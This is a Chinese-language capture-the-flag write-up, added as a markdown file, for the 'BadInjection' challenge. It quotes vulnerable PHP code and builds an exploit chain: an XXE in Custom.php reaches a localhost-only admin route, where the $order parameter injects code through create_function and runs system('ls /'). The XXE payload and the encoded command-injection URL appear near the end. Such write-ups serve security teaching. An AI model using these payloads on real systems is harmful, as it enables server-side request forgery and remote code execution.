@@ -1,0 +1,79 @@
+都是队伍里面师傅做出来的，我跟着复现一波思路Orz
+
+# BadInjection
+
+存在一个文件下载，顺藤摸瓜依次下载到index.php，Routers.php，Custom.php，Admin.php。
+
+查看Custom.php：
+
+```php
+<?php
+class Custom extends Controller{
+  public static function Test($string){
+      $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
+      $test = $root->name;
+      echo $test;
+  }
+}
+?>
+
+```
+
+其存在XXE:
+
+![1548596007409](writeup/1548596007409.png)
+
+接着再看Admin.php：
+
+```php
+<?php
+
+class Admin extends Controller{
+  public static function sort($url,$order){
+    $uri = parse_url($url);
+    $file = file_get_contents($url);
+    $dom = new DOMDocument();
+    $dom->loadXML($file,LIBXML_NOENT | LIBXML_DTDLOAD);
+    $xml = simplexml_import_dom($dom);
+    if($xml){
+     //echo count($xml->channel->item);
+     //var_dump($xml->channel->item->link);
+     $data = [];
+     for($i=0;$i<count($xml->channel->item);$i++){
+       //echo $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link."\n";
+       $data[] = new Url($i,$uri['scheme'].'://'.$uri['host'].$xml->channel->item[$i]->link);
+       //$data[$i] = $uri['scheme'].$uri['host'].$xml->channel->item[$i]->link;
+     }
+     //var_dump($data);
+     usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
+     echo '<div class="ui list">';
+     foreach($data as $dt) {
+
+       $html = '<div class="item">';
+       $html .= ''.$dt->id.' - ';
+       $html .= ' <a href="'.$dt->link.'">'.$dt->link.'</a>';
+       $html .= '</div>';
+     }
+     $html .= "</div>";
+     echo $html;
+    }else{
+//...
+```
+
+Lz1y师傅提示create_function存在注入，前面url给一个rss的订阅源，后面的$order就是注入点：
+
+```
+http://localhost/admin?rss=http://anemone.top/atom.xml&order=link);}system("ls /");//
+```
+
+从Routers.php可以指导admin.php只能localhost访问，因此只能用xxe打内网了:
+
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xxe [
+<!ENTITY xxe SYSTEM "http://localhost/admin?rss=http://anemone.top/atom.xml&order=%6c%69%6e%6b%29%3b%7d%73%79%73%74%65%6d%28%22%6c%73%22%29%3b%2f%2f" >]>
+<root>
+<name>&xxe;</name>
+</root>
+```
+
